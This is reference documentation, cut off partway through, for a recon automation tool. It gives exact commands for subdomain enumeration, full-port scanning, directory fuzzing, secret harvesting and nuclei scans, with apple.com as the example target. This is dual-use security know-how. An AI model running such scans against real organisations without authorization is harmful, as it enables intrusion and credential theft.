# reconx Tools Reference Documentation

## Overview

This document details every external tool used in each reconx phase, including:
- Purpose and functionality
- Exact execution commands with flags
- Input/output handling
- Error handling and fallbacks

---

## Phase 1: Subdomain & Asset Discovery

### Tools Used
1. **subfinder** - Fast passive subdomain discovery
2. **amass** - Comprehensive subdomain enumeration (passive + active)
3. **assetfinder** - Simple subdomain discovery
4. **dnsx** - DNS resolution and verification
5. **httpx** - Live subdomain verification
6. **crt.sh** - Certificate transparency logs (API call)
7. **chaos** - ProjectDiscovery dataset (API call)

---

### 1. subfinder

**Purpose:** Discover subdomains via passive sources (certificates, archives, etc.)

**Command:**
```bash
subfinder -d {target} -silent -o {output_file}
```

**Flags:**
- `-d {target}`: Target domain (e.g., `apple.com`)
- `-silent`: Output only subdomains (no banners/status)
- `-o {output_file}`: Write results to file

**Example:**
```python
# From phase1_discovery.py
cmd = [
    self.get_tool_path('subfinder'),
    '-d', self.target,           # e.g., "apple.com"
    '-silent',
    '-o', str(output_file)       # e.g., "workspaces/apple.com/raw/subfinder.txt"
]

# Actual execution:
# subfinder -d apple.com -silent -o workspaces/apple.com/raw/subfinder.txt
```

**Output Format:** Plain text, one subdomain per line
```
dev.apple.com
api.apple.com
staging.apple.com
```

**Error Handling:**
- If tool not found: Log warning, skip, continue with other tools
- If zero output: Continue (other tools may find subdomains)

---

### 2. amass (Passive)

**Purpose:** Deep passive enumeration via OSINT sources

**Command:**
```bash
amass enum -passive -d {target} -o {output_file}
```

**Flags:**
- `enum`: Enumeration mode
- `-passive`: Use only passive sources (no DNS resolution)
- `-d {target}`: Target domain
- `-o {output_file}`: Output file path

**Example:**
```python
cmd = [
    self.get_tool_path('amass'),
    'enum', '-passive',
    '-d', self.target,
    '-o', str(output_file)       # "workspaces/apple.com/raw/amass_passive.txt"
]

# Actual execution:
# amass enum -passive -d apple.com -o workspaces/apple.com/raw/amass_passive.txt
```

**Output Format:** Plain text, one subdomain per line

**Note:** Can be slow (5-10 minutes for large domains). Runs in parallel with other tools.

---

### 3. amass (Active)

**Purpose:** Active DNS enumeration with resolution

**Command:**
```bash
amass enum -active -d {target} -o {output_file}
```

**Flags:**
- `-active`: Perform active DNS resolution and brute forcing

**Example:**
```python
cmd = [
    self.get_tool_path('amass'),
    'enum', '-active',
    '-d', self.target,
    '-o', str(output_file)       # "workspaces/apple.com/raw/amass_active.txt"
]

# Actual execution:
# amass enum -active -d apple.com -o workspaces/apple.com/raw/amass_active.txt
```

**Warning:** Active mode sends DNS queries. Use with caution on monitored networks.

---

### 4. assetfinder

**Purpose:** Find subdomains from various sources

**Command:**
```bash
assetfinder --subs-only {target}
```

**Flags:**
- `--subs-only`: Output only subdomains (no domains)
- `{target}`: Target domain (no flag, positional argument)

**Example:**
```python
cmd = [
    self.get_tool_path('assetfinder'),
    '--subs-only',
    self.target                  # e.g., "apple.com"
]

# Actual execution:
# assetfinder --subs-only apple.com
# Output captured to: workspaces/apple.com/raw/assetfinder.txt
```

**Output Handling:**
```python
# stdout captured, then written to file
subdomains = [line.strip() for line in result.stdout.split('\n') if line.strip()]
```

---

### 5. dnsx

**Purpose:** DNS resolution - verify which subdomains resolve to IPs

**Command:**
```bash
dnsx -l {input_file} -silent -o {output_file}
```

**Flags:**
- `-l {input_file}`: File with subdomains to resolve
- `-silent`: Show only resolvable subdomains
- `-o {output_file}`: Output file

**Example:**
```python
# After merging all discovered subdomains
cmd = [
    self.get_tool_path('dnsx'),
    '-l', str(merged_file),      # "workspaces/apple.com/raw/subdomains_merged.txt"
    '-silent',
    '-o', str(output_file)       # "workspaces/apple.com/raw/subdomains_resolved.txt"
]

# Actual execution:
# dnsx -l workspaces/apple.com/raw/subdomains_merged.txt \
#      -silent \
#      -o workspaces/apple.com/raw/subdomains_resolved.txt
```

**Input Format:** Plain text subdomains (from merged discovery results)
```
dev.apple.com
api.apple.com
test.apple.com
```

**Output Format:** Only resolvable subdomains
```
api.apple.com
dev.apple.com
```

**Fallback:** If dnsx not installed, assumes all subdomains are valid and passes them through.

---

### 6. httpx (Live Check)

**Purpose:** Verify which subdomains have live HTTP/HTTPS services

**Command:**
```bash
httpx -l {input_file} -silent -o {output_file}
```

**Flags:**
- `-l {input_file}`: File with subdomains/URLs to check
- `-silent`: Output only live URLs
- `-o {output_file}`: Output file

**Example:**
```python
# Input: list of resolved subdomains
cmd = [
    self.get_tool_path('httpx'),
    '-l', str(input_file),       # "workspaces/apple.com/raw/httpx_input.txt"
    '-silent',
    '-o', str(output_file)       # "workspaces/apple.com/raw/subdomains_live.txt"
]

# Actual execution:
# httpx -l workspaces/apple.com/raw/httpx_input.txt \
#       -silent \
#       -o workspaces/apple.com/raw/subdomains_live.txt
```

**Input Preparation:**
```python
# Convert subdomains to URLs
urls = []
for sub in subdomains:
    if not sub.startswith(('http://', 'https://')):
        urls.append(f"https://{sub}")
        urls.append(f"http://{sub}")
```

**Output Format:** Live URLs only
```
https://api.apple.com
https://dev.apple.com
http://staging.apple.com
```

---

### 7. crt.sh (API)

**Purpose:** Query Certificate Transparency logs via crt.sh API

**Command:** HTTP GET request (no external tool needed)
```
https://crt.sh/?q=%.{target}&output=json
```

**Example:**
```python
url = f"https://crt.sh/?q=%.{self.target}&output=json"
# e.g., https://crt.sh/?q=%.apple.com&output=json

result = await self.runner.fetch_url(url)
# Uses internal async HTTP client (curl subprocess)
```

**Response Format:** JSON array
```json
[
  {
    "issuer_ca_id": 12345,
    "issuer_name": "C=US, O=DigiCert Inc, CN=DigiCert TLS RSA SHA256 2020 CA1",
    "name_value": "dev.apple.com\napi.apple.com",
    "min_cert_id": 1234567890,
    "min_entry_timestamp": "2023-01-01T00:00:00.000",
    "not_before": "2023-01-01T00:00:00",
    "not_after": "2024-01-01T23:59:59"
  }
]
```

**Parsing:**
```python
# Extract subdomains from name_value (can be multi-line)
for entry in data:
    name = entry.get('name_value', '')
    for sub in name.split('\n'):
        sub = sub.strip()
        if sub and '*' not in sub:  # Skip wildcards
            subdomains.append(sub)
```

---

### 8. Chaos API

**Purpose:** Query ProjectDiscovery Chaos dataset (requires API key)

**Command:** HTTP GET with Authorization header
```
https://dns.projectdiscovery.io/dns/{target}/subdomains
```

**Example:**
```python
api_key = self.config.get('chaos_api_key')
url = f"https://dns.projectdiscovery.io/dns/{self.target}/subdomains"

result = await self.runner.fetch_url(
    url,
    headers={"Authorization": api_key}
)
```

**Response Format:** JSON
```json
{
  "domain": "apple.com",
  "subdomains": ["api", "dev", "staging", "test"]
}
```

**Processing:**
```python
subdomains = [f"{sub}.{self.target}" for sub in data.get('subdomains', [])]
# api.apple.com, dev.apple.com, etc.
```

**Note:** Skipped if no API key configured.

---

## Phase 2: HTTP Probing & Tech Fingerprinting

### Tools Used
1. **httpx** - Detailed HTTP probing with tech detection
2. **masscan** - Fast port scanning
3. **nmap** - Service version detection
4. **wafw00f** - WAF detection

---

### 1. httpx (Detailed Probing)

**Purpose:** Deep HTTP fingerprinting (status, title, tech stack, headers)

**Command:**
```bash
httpx -l {urls_file} -tech-detect -status-code -title -content-length \
      -follow-redirects -json -o {output_file}
```

**Flags:**
- `-l {urls_file}`: Input file with URLs
- `-tech-detect`: Detect technologies (Wappalyzer database)
- `-status-code`: Show HTTP status code
- `-title`: Extract page title
- `-content-length`: Show response size
- `-follow-redirects`: Follow HTTP redirects
- `-json`: Output as JSON Lines (JSONL)
- `-o {output_file}`: Output file

**Example:**
```python
cmd = [
    self.get_tool_path('httpx'),
    '-l', str(urls_file),            # "workspaces/apple.com/urls.txt"
    '-tech-detect',
    '-status-code',
    '-title',
    '-content-length',
    '-follow-redirects',
    '-json',
    '-o', str(output_file)           # "workspaces/apple.com/raw/httpx_out.jsonl"
]

# Actual execution:
# httpx -l workspaces/apple.com/urls.txt \
#       -tech-detect -status-code -title -content-length \
#       -follow-redirects -json \
#       -o workspaces/apple.com/raw/httpx_out.jsonl
```

**Input Format:** Plain text URLs
```
https://api.apple.com
https://dev.apple.com
http://staging.apple.com
```

**Output Format:** JSON Lines (one JSON object per line)
```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "url": "https://api.apple.com",
  "host": "api.apple.com",
  "port": "443",
  "scheme": "https",
  "status_code": 200,
  "title": "Apple API Documentation",
  "content_length": 15420,
  "tech": ["nginx", "Express", "React"],
  "cdn": true,
  "ip": "17.253.144.10"
}
```

**Parsing in Code:**
```python
results = []
with open(output_file, 'r') as f:
    for line in f:
        if line.strip():
            data = json.loads(line)
            results.append(data)
            # Extract: url, status_code, title, tech[], ip, content_length
```

**Fallback:** If httpx not installed, creates basic probe data from URLs with status_code: 0

---

### 2. masscan

**Purpose:** Ultra-fast port scanning (asynchronous SYN scanner)

**Command:**
```bash
masscan -iL {ips_file} -p1-65535 --rate 1000 -oJ {output_file}
```

**Flags:**
- `-iL {ips_file}`: Input file with IP addresses
- `-p1-65535`: Scan all ports (1-65535)
- `--rate 1000`: Packets per second (adjust for network)
- `-oJ {output_file}`: Output in JSON format

**Example:**
```python
cmd = [
    self.get_tool_path('masscan'),
    '-iL', str(ips_file),            # "workspaces/apple.com/raw/ips.txt"
    '-p1-65535',
    '--rate', '1000',
    '-oJ', str(output_file)          # "workspaces/apple.com/raw/masscan_out.json"
]

# Actual execution:
# masscan -iL workspaces/apple.com/raw/ips.txt \
#         -p1-65535 --rate 1000 \
#         -oJ workspaces/apple.com/raw/masscan_out.json
```

**Input Format:** Plain text IPs (extracted from Phase 1 results)
```
17.253.144.10
17.253.144.11
17.142.160.59
```

**Output Format:** JSON
```json
[
  {
    "ip": "17.253.144.10",
    "ports": [
      {"port": 80, "proto": "tcp", "status": "open", "reason": "syn-ack"},
      {"port": 443, "proto": "tcp", "status": "open", "reason": "syn-ack"},
      {"port": 8080, "proto": "tcp", "status": "open", "reason": "syn-ack"}
    ]
  }
]
```

**Parsing:**
```python
port_results = {}
for entry in data:
    ip = entry.get('ip')
    ports = [p['port'] for p in entry.get('ports', [])]
    port_results[ip] = ports
# {"17.253.144.10": [80, 443, 8080]}
```

**Note:** Requires root/sudo privileges. Skipped if not available.

---

### 3. nmap

**Purpose:** Service version detection on discovered open ports

**Command:**
```bash
nmap -sV -iL {open_ports_file} -oJ {output_file}
```

**Flags:**
- `-sV`: Probe open ports to determine service/version info
- `-iL {open_ports_file}`: Input file with `IP:port` format
- `-oJ {output_file}`: Output in JSON format

**Example:**
```python
# First, create open_ports.txt from masscan results
with open(open_ports_file, 'w') as f:
    for ip, ports in masscan_results.items():
        for port in ports:
            f.write(f"{ip}:{port}\n")

cmd = [
    self.get_tool_path('nmap'),
    '-sV',
    '-iL', str(open_ports_file),     # "workspaces/apple.com/raw/open_ports.txt"
    '-oJ', str(output_file)           # "workspaces/apple.com/raw/nmap_out.json"
]

# Actual execution:
# nmap -sV -iL workspaces/apple.com/raw/open_ports.txt \
#      -oJ workspaces/apple.com/raw/nmap_out.json
```

**Input Format:** `IP:port` pairs
```
17.253.144.10:80
17.253.144.10:443
17.253.144.10:8080
```

**Output Format:** JSON (nmap's JSON output)

**Note:** Slow on many ports. Only runs if masscan found open ports.

---

### 4. wafw00f

**Purpose:** Detect Web Application Firewalls

**Command:**
```bash
wafw00f {url} -o {output_file}
```

**Flags:**
- `{url}`: Target URL (positional)
- `-o {output_file}`: JSON output file

**Example:**
```python
# Sample only first 20 URLs to avoid overwhelming
sample_urls = urls[:20] if len(urls) > 20 else urls

for url in sample_urls:
    output_file = self.workspace.get_raw_file(f"wafw00f_{safe_url}.json")

    cmd = [
        self.get_tool_path('wafw00f'),
        url,                             # e.g., "https://api.apple.com"
        '-o', str(output_file)
    ]

    # Actual execution:
    # wafw00f https://api.apple.com -o workspaces/apple.com/raw/wafw00f_https___api.apple.com.json
```

**Output Format:** JSON array
```json
[
  {
    "url": "https://api.apple.com",
    "detected": true,
    "firewall": "Cloudflare",
    "manufacturer": "Cloudflare, Inc."
  }
]
```

**Processing:**
```python
waf_results = {}
if data and len(data) > 0:
    waf = data[0].get('firewall', '')
    if waf:
        waf_results[url] = waf
        # Mark for FP Filter penalty
```

**Integration:** WAF detection triggers -15 penalty in FP Filter (responses may be altered).

---

## Phase 3: URL & Endpoint Crawling

### Tools Used
1. **katana** - Modern web crawler (headless + passive)
2. **gospider** - Fast web spider
3. **hakrawler** - URL discovery crawler
4. **waybackurls** - Wayback Machine historical URLs
5. **gau** (GetAllUrls) - Alternative historical URL source
6. **linkfinder** - JavaScript endpoint extraction

---

### 1. katana

**Purpose:** Comprehensive crawling with JavaScript execution

**Command:**
```bash
katana -u {url} -headless -js-crawl -depth 5 -concurrency 20 -silent -o {output}
```

**Flags:**
- `-u {url}`: Target URL to crawl
- `-headless`: Use headless browser for JavaScript rendering
- `-js-crawl`: Crawl JavaScript-rendered content
- `-depth 5`: Maximum crawl depth (levels)
- `-concurrency 20`: Parallel requests
- `-silent`: Output only URLs
- `-o {output}`: Output file

**Example:**
```python
# Run on first 5 URLs only (to avoid overwhelming)
for url in urls[:5]:
    output_file = self.workspace.get_raw_file(f"katana_{safe_url}.txt")

    cmd = [
        self.get_tool_path('katana'),
        '-u', url,                       # e.g., "https://api.apple.com"
        '-headless',
        '-js-crawl',
        '-depth', '5',
        '-concurrency', '20',
        '-silent',
        '-o', str(output_file)
    ]

    # Actual execution:
    # katana -u https://api.apple.com -headless -js-crawl \
    #        -depth 5 -concurrency 20 -silent \
    #        -o workspaces/apple.com/raw/katana_https___api.apple.com.txt
```

**Output Format:** Plain text URLs
```
https://api.apple.com/docs
https://api.apple.com/v1/users
https://api.apple.com/v1/products
https://api.apple.com/static/js/app.js
```

---

### 2. gospider

**Purpose:** Fast spider with multiple source integration

**Command:**
```bash
gospider -s {url} -o {output_dir} -t 20 --depth 5
```

**Flags:**
- `-s {url}`: Target URL
- `-o {output_dir}`: Output directory (creates multiple files)
- `-t 20`: Threads
- `--depth 5`: Crawl depth

**Example:**
```python
for url in urls[:5]:
    output_dir = self.workspace.get_raw_file(f"gospider_{safe_url}")

    cmd = [
        self.get_tool_path('gospider'),
        '-s', url,
        '-o', str(output_dir),
        '-t', '20',
        '--depth', '5'
    ]

    # Actual execution:
    # gospider -s https://api.apple.com \
    #          -o workspaces/apple.com/raw/gospider_https___api.apple.com \
    #          -t 20 --depth 5
```

**Output Handling:**
```python
# Parse all .txt files in output directory
urls = []
for file in output_dir.glob('*.txt'):
    with open(file, 'r') as f:
        for line in f:
            if line.strip().startswith('http'):
                urls.append(line.strip())
```

---

### 3. hakrawler

**Purpose:** Simple, fast URL discovery

**Command:**
```bash
hakrawler -url {url} -depth 5 -plain
```

**Flags:**
- `-url {url}`: Target URL
- `-depth 5`: Crawl depth
- `-plain`: Plain text output (no formatting)

**Example:**
```python
for url in urls[:5]:
    cmd = [
        self.get_tool_path('hakrawler'),
        '-url', url,
        '-depth', '5',
        '-plain'
    ]

    # Actual execution:
    # hakrawler -url https://api.apple.com -depth 5 -plain
    # Output captured from stdout
```

**Output Handling:**
```python
urls = [line.strip() for line in result.stdout.split('\n') 
        if line.strip().startswith('http')]
```

---

### 4. waybackurls

**Purpose:** Fetch URLs from Internet Archive (Wayback Machine)

**Command:**
```bash
waybackurls {domain}
```

**Flags:**
- `{domain}`: Domain to query (positional, no flag)

**Example:**
```python
cmd = [
    self.get_tool_path('waybackurls'),
    self.target                       # e.g., "apple.com"
]

# Actual execution:
# waybackurls apple.com
# Output: workspaces/apple.com/raw/waybackurls.txt
```

**Output Format:** Plain text URLs (historical)
```
https://apple.com/old-product-page
https://apple.com/api/v1/deprecated
https://dev.apple.com/2019/docs
```

**Value:** Finds endpoints that existed previously but may not be linked anymore.

---

### 5. gau (GetAllUrls)

**Purpose:** Alternative to waybackurls with more sources

**Command:**
```bash
gau {domain}
```

**Example:**
```python
cmd = [
    self.get_tool_path('gau'),
    self.target                       # e.g., "apple.com"
]

# Actual execution:
# gau apple.com
# Output: workspaces/apple.com/raw/gau.txt
```

**Sources:** Wayback Machine, Common Crawl, AlienVault OTX

---

### 6. linkfinder

**Purpose:** Extract endpoints from JavaScript files and convert to full URLs

**Command:**
```bash
linkfinder -i {js_url} -o cli
```

**Flags:**
- `-i {js_url}`: JavaScript file URL
- `-o cli`: Output to command line (stdout)

**Example:**
```python
from urllib.parse import urljoin, urlparse

for js_url in js_files[:20]:      # Limit to 20 JS files
    cmd = [
        self.get_tool_path('linkfinder'),
        '-i', js_url,                # e.g., "https://api.apple.com/static/js/app.js"
        '-o', 'cli'
    ]

    result = await self.runner.run(f'linkfinder_{js_url}', cmd)

    if result.success:
        relative_paths = [line.strip() for line in result.stdout.split('
') if line.strip()]

        # Extract base URL from JS file location
        parsed = urlparse(js_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Convert relative paths to full URLs
        for path in relative_paths:
            if path.startswith('http'):
                full_url = path                           # Already absolute
            elif path.startswith('//'):
                full_url = f"{parsed.scheme}:{path}"      # Protocol-relative
            elif path.startswith('/'):
                full_url = urljoin(base_url, path)        # Absolute path
            else:
                js_dir = js_url.rsplit('/', 1)[0]
                full_url = urljoin(js_dir + '/', path)   # Relative path

            if is_in_scope(full_url, self.scope, self.exclude):
                all_endpoints.append(full_url)
```

**Output Format (Raw from tool):** Relative endpoints
```
/api/v1/users
/api/v1/products
../internal/admin
../../static/images/
//cdn.example.com/assets
https://api.other.com/data
```

**After Processing:** Full URLs saved to `linkfinder_endpoints.txt`
```
https://api.apple.com/api/v1/users
https://api.apple.com/api/v1/products
https://api.apple.com/internal/admin
https://api.apple.com/static/images/
https://cdn.example.com/assets
https://api.other.com/data
```

**Path Resolution Logic:**

| Path Type | Example Input | JS File URL | Result | Method |
|-----------|---------------|-------------|--------|--------|
| Absolute URL | `https://other.com/data` | Any | `https://other.com/data` | Keep as-is |
| Protocol-relative | `//cdn.com/assets` | `https://site.com/js/app.js` | `https://cdn.com/assets` | Add scheme |
| Absolute path | `/api/users` | `https://site.com/js/app.js` | `https://site.com/api/users` | urljoin with base |
| Relative path | `api/users` | `https://site.com/js/app.js` | `https://site.com/js/api/users` | urljoin with JS dir |
| Relative parent | `../api/users` | `https://site.com/js/app.js` | `https://site.com/api/users` | Resolved by urljoin |

**Output File:** `workspaces/{target}/raw/linkfinder_endpoints.txt`

**Key Points:**
- Output is captured from **stdout** (not saved to file by linkfinder itself)
- Relative paths are **converted to absolute URLs** using the JS file's location
- **Scope validation** is performed before saving
- Results are **deduplicated and sorted** before saving

---

## Phase 4: Directory Enumeration & Parameter Discovery

### Tools Used
1. **ffuf** - Fast web fuzzer (directories)
2. **feroxbuster** - Recursive content discovery
3. **paramspider** - Parameter discovery
4. **arjun** - HTTP parameter discovery
5. **x8** - Hidden parameter discovery
6. **gf** - grep on steroids (pattern matching)

---

### 1. ffuf (Directory Enumeration)

**Purpose:** Brute-force hidden directories and files

**Command:**
```bash
ffuf -u {url}/FUZZ -w {wordlist} -t 40 -mc 200,301,302,403,405 -o {output} -of json
```

**Flags:**
- `-u {url}/FUZZ`: Target URL with FUZZ keyword (injection point)
- `-w {wordlist}`: Wordlist file
- `-t 40`: Threads
- `-mc 200,301,302,403,405`: Match HTTP codes (hide 404s)
- `-o {output}`: Output file
- `-of json`: Output format JSON

**Example:**
```python
wordlist = self._find_wordlist()  # e.g., /usr/share/seclists/common.txt

for url in base_urls[:10]:        # Limit to 10 base URLs
    output_file = self.workspace.get_raw_file(f"ffuf_{safe_url}.json")

    cmd = [
        self.get_tool_path('ffuf'),
        '-u', f"{url}/FUZZ",          # e.g., "https://api.apple.com/FUZZ"
        '-w', str(wordlist),
        '-t', '40',
        '-mc', '200,301,302,403,405',
        '-o', str(output_file),
        '-of', 'json'
    ]

    # Actual execution:
    # ffuf -u https://api.apple.com/FUZZ \
    #      -w /usr/share/seclists/common.txt \
    #      -t 40 -mc 200,301,302,403,405 \
    #      -o workspaces/apple.com/raw/ffuf_https___api.apple.com.json \
    #      -of json
```

**Output Format:** JSON
```json
{
  "results": [
    {
      "status": 200,
      "length": 1543,
      "words": 120,
      "lines": 45,
      "url": "https://api.apple.com/admin",
      "input": {"FUZZ": "admin"}
    },
    {
      "status": 301,
      "length": 0,
      "url": "https://api.apple.com/api",
      "input": {"FUZZ": "api"}
    }
  ]
}
```

**Parsing:**
```python
dirs = set()
for entry in data.get('results', []):
    path = entry.get('input', {}).get('FUZZ', '')
    if path:
        dirs.add(f"{url}/{path}")
```

---

### 2. feroxbuster

**Purpose:** Recursive directory enumeration with smart filtering

**Command:**
```bash
feroxbuster -u {url} -w {wordlist} -t 20 --json -o {output}
```

**Flags:**
- `-u {url}`: Target URL
- `-w {wordlist}`: Wordlist file
- `-t 20`: Threads
- `--json`: JSON output
- `-o {output}`: Output file

**Example:**
```python
for url in base_urls[:5]:
    output_file = self.workspace.get_raw_file(f"ferox_{safe_url}.json")

    cmd = [
        self.get_tool_path('feroxbuster'),
        '-u', url,
        '-w', str(wordlist),
        '-t', '20',
        '--json',
        '-o', str(output_file)
    ]

    # Actual execution:
    # feroxbuster -u https://api.apple.com \
    #             -w /usr/share/seclists/common.txt \
    #             -t 20 --json \
    #             -o workspaces/apple.com/raw/ferox_https___api.apple.com.json
```

**Output Format:** JSON Lines (one object per line)
```json
{"url": "https://api.apple.com/admin", "status": 200, "content_length": 1543}
{"url": "https://api.apple.com/api", "status": 200, "content_length": 2048}
```

---

### 3. paramspider

**Purpose:** Discover parameters from web archives and sources

**Command:**
```bash
paramspider -d {domain} -o {output_dir}
```

**Flags:**
- `-d {domain}`: Target domain
- `-o {output_dir}`: Output directory

**Example:**
```python
output_dir = self.workspace.get_raw_file("paramspider_output")

cmd = [
    self.get_tool_path('paramspider'),
    '-d', self.target,               # e.g., "apple.com"
    '-o', str(output_dir)
]

# Actual execution:
# paramspider -d apple.com -o workspaces/apple.com/raw/paramspider_output
```

**Output Handling:**
```python
params = []
for file in output_dir.glob('*.txt'):
    with open(file, 'r') as f:
        for line in f:
            url = line.strip()
            if '?' in url:
                # Parse query parameters
                parsed = urlparse(url)
                for param in parsed.query.split('&'):
                    if '=' in param:
                        param_name = param.split('=')[0]
                        params.append(Parameter(
                            url=url.split('?')[0],
                            param=param_name,
                            method="GET"
                        ))
```

---

### 4. arjun

**Purpose:** Discover hidden HTTP parameters via brute force

**Command:**
```bash
arjun -u {url} -oJ {output_file}
```

**Flags:**
- `-u {url}`: Target URL with parameter
- `-oJ {output_file}`: JSON output

**Example:**
```python
for url in sampled_urls[:20]:
    output_file = self.workspace.get_raw_file(f"arjun_{safe_url}.json")

    cmd = [
        self.get_tool_path('arjun'),
        '-u', url,                       # e.g., "https://api.apple.com/search"
        '-oJ', str(output_file)
    ]

    # Actual execution:
    # arjun -u https://api.apple.com/search \
    #       -oJ workspaces/apple.com/raw/arjun_https___api.apple.com.json
```

**Output Format:** JSON
```json
{
  "params": [
    {"name": "q", "method": "GET"},
    {"name": "page", "method": "GET"},
    {"name": "limit", "method": "GET"}
  ]
}
```

---

### 5. x8

**Purpose:** Hidden parameter discovery via differential analysis

**Command:**
```bash
x8 -u {url} -w {wordlist} -o {output_file}
```

**Flags:**
- `-u {url}`: Target URL
- `-w {wordlist}`: Parameter wordlist
- `-o {output_file}`: JSON output

**Example:**
```python
wordlist = Path(self.wordlist_dirs) / "parameters.txt"

for url in sampled_urls[:10]:
    output_file = self.workspace.get_raw_file(f"x8_{safe_url}.json")

    cmd = [
        self.get_tool_path('x8'),
        '-u', url,
        '-w', str(wordlist),
        '-o', str(output_file)
    ]

    # Actual execution:
    # x8 -u https://api.apple.com/search \
    #    -w /usr/share/seclists/parameters.txt \
    #    -o workspaces/apple.com/raw/x8_https___api.apple.com.json
```

---

### 6. gf (grep on steroids)

**Purpose:** Pattern matching on discovered URLs for vulnerability indicators

**Command:**
```bash
gf {pattern} {urls_file}
```

**Patterns Used:**
- `xss`: XSS-prone parameters (e.g., `?q=`, `?search=`)
- `sqli`: SQL injection indicators
- `ssrf`: SSRF-prone parameters (e.g., `?url=`, `?path=`)
- `redirect`: Open redirect parameters
- `lfi`: Local file inclusion indicators

**Example:**
```python
all_urls_file = self.workspace.workspace_path / "all_urls.txt"
patterns = ['xss', 'sqli', 'ssrf', 'redirect', 'lfi']

for pattern in patterns:
    output_file = self.workspace.gf_patterns_path / f"{pattern}.txt"

    cmd = [
        self.get_tool_path('gf'),
        pattern,                         # e.g., "xss"
        str(all_urls_file)               # All discovered URLs
    ]

    # Actual execution:
    # gf xss workspaces/apple.com/all_urls.txt
    # Output: workspaces/apple.com/gf_patterns/xss.txt
```

**Output:** URLs matching the pattern (for prioritization in Phase 5)

---

## Phase 5: Secret Hunting & Vulnerability Scanning

### Tools Used
1. **secretfinder** - Find secrets in JavaScript files
2. **trufflehog** - Deep secret scanning
3. **gitdorker** - GitHub secret discovery
4. **nuclei** - Vulnerability scanner (CVEs, exposures)
5. **nikto** - Web vulnerability scanner

---

### 1. secretfinder

**Purpose:** Extract secrets (API keys, tokens) from JavaScript

**Command:**
```bash
secretfinder -i {js_url} -o cli
```

**Flags:**
- `-i {js_url}`: JavaScript file URL
- `-o cli`: Output to console

**Example:**
```python
for js_url in js_files[:30]:      # Limit to 30 JS files
    cmd = [
        self.get_tool_path('secretfinder'),
        '-i', js_url,                # e.g., "https://api.apple.com/static/app.js"
        '-o', 'cli'
    ]

    # Actual execution:
    # secretfinder -i https://api.apple.com/static/app.js -o cli
```

**Output Format:** `TYPE: value`
```
API_KEY: ak_live_51H8x...9J2m
AWS_KEY: AKIAIOSFODNN7EXAMPLE
SECRET_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Parsing:**
```python
for line in result.stdout.split('\n'):
    if ':' in line:
        parts = line.split(':', 1)
        secret_type = parts[0].strip()
        secret_value = parts[1].strip()

        findings.append(Finding(
            url=js_url,
            vuln_type="secret",
            tool="secretfinder",
            severity="high" if any(k in secret_type.lower() for k in ['key', 'token']) else "medium",
            evidence=redact_secrets(f"{secret_type}: {secret_value}"),
            confidence="medium"
        ))
```

---

### 2. trufflehog

**Purpose:** Scan filesystem for secrets (entropy + regex)

**Command:**
```bash
trufflehog filesystem {path} --json -o {output_file}
```

**Flags:**
- `filesystem {path}`: Scan directory
- `--json`: JSON output
- `-o {output_file}`: Output file

**Example:**
```python
output_file = self.workspace.get_raw_file("trufflehog_out.json")

cmd = [
    self.get_tool_path('trufflehog'),
    'filesystem',
    str(self.workspace.workspace_path),  # Scan entire workspace
    '--json',
    '-o', str(output_file)
]

# Actual execution:
# trufflehog filesystem workspaces/apple.com --json \
#             -o workspaces/apple.com/raw/trufflehog_out.json
```

**Output Format:** JSON Lines
```json
{
  "SourceMetadata": {
    "Data": {
      "Filesystem": {
        "file": "workspaces/apple.com/raw/httpx_out.jsonl"
      }
    }
  },
  "Raw": "api_key=sk_live_51H8xample...",
  "DetectorName": "Stripe",
  "Verified": false
}
```

---

### 3. gitdorker

**Purpose:** Find sensitive files on GitHub via dorking

**Command:**
```bash
gitdorker -q {domain} -t {github_token}
```

**Flags:**
- `-q {domain}`: Search query (domain)
- `-t {token}`: GitHub personal access token

**Example:**
```python
if self.config.get('github_token'):
    output_file = self.workspace.get_raw_file("gitdorker_out.txt")

    cmd = [
        self.get_tool_path('gitdorker'),
        '-q', self.target,           # e.g., "apple.com"
        '-t', self.config.get('github_token')
    ]

    # Actual execution:
    # gitdorker -q apple.com -t ghp_xxxxxxxxxxxx
```

**Output:** GitHub URLs with potentially sensitive files
```
https://github.com/company/repo/blob/main/config.yml
https://github.com/company/legacy/blob/master/.env
```

---

### 4. nuclei (Vulnerability Scanning)

**Purpose:** Scan for known vulnerabilities using templates

**Command (Standard):**
```bash
nuclei -l {urls_file} -t {templates_path} -severity critical,high,medium -json -o {output} -rate-limit {rate}
```

**Flags:**
- `-l {urls_file}`: File with URLs to scan
- `-t {templates_path}`: Nuclei templates directory
- `-severity critical,high,medium`: Filter by severity
- `-json`: JSON Lines output
- `-o {output}`: Output file
- `-rate-limit {rate}`: Requests per second

**Example:**
```python
urls_file = self.workspace.workspace_path / "urls_for_scanning.txt"
output_file = self.workspace.get_raw_file("nuclei_out.jsonl")

cmd = [
    self.get_tool_path('nuclei'),
    '-l', str(urls_file),
    '-t', self.nuclei_templates,     # e.g., "/usr/share/nuclei-templates/"
    '-severity', 'critical,high,medium',
    '-json',
    '-o', str(output_file),
    '-rate-limit', str(self.rate_limit)  # From config (default 50)
]

# Actual execution:
# nuclei -l workspaces/apple.com/urls_for_scanning.txt \
#        -t /usr/share/nuclei-templates/ \
#        -severity critical,high,medium \
#        -json \
#        -o workspaces/apple.com/raw/nuclei_out.jsonl \
#        -rate-limit 50
```

**Output Format:** JSON Lines
```json
{
  "template-id": "CVE-2023-1234",
  "info": {
    "name": "Apache Struts RCE",
    "severity": "critical",
    "tags": ["cve", "rce", "apache", "struts"]
  },
  "host": "https://api.apple.com",
  "matched-at": "https://api.apple.com/login",
  "extracted-results": ["Struts 2.3.31"],
  "request": "GET /login HTTP/1.1\nHost: api.apple.com",
  "response": "HTTP/1.1 200 OK\n..."
}
```

**Command (Exposures):**
```bash
nuclei -l {urls_file} -t {templates}/exposures -json -o {output}
```

**Example:**
```python
exposures_path = Path(self.nuclei_templates) / "exposures"

if exposures_path.exists():
    cmd = [
        self.get_tool_path('nuclei'),
        '-l', str(urls_file),
        '-t', str(exposures_path),
        '-json',
        '-o', str(output_file)
    ]
```

---

### 5. nikto

**Purpose:** Comprehensive web vulnerability scan

**Command:**
```bash
nikto -h {url} -Format json -o {output_file}
```

**Flags:**
- `-h {url}`: Target host/URL
- `-Format json`: JSON output
- `-o {output_file}`: Output file

**Example:**
```python
# Sample first 5 base URLs
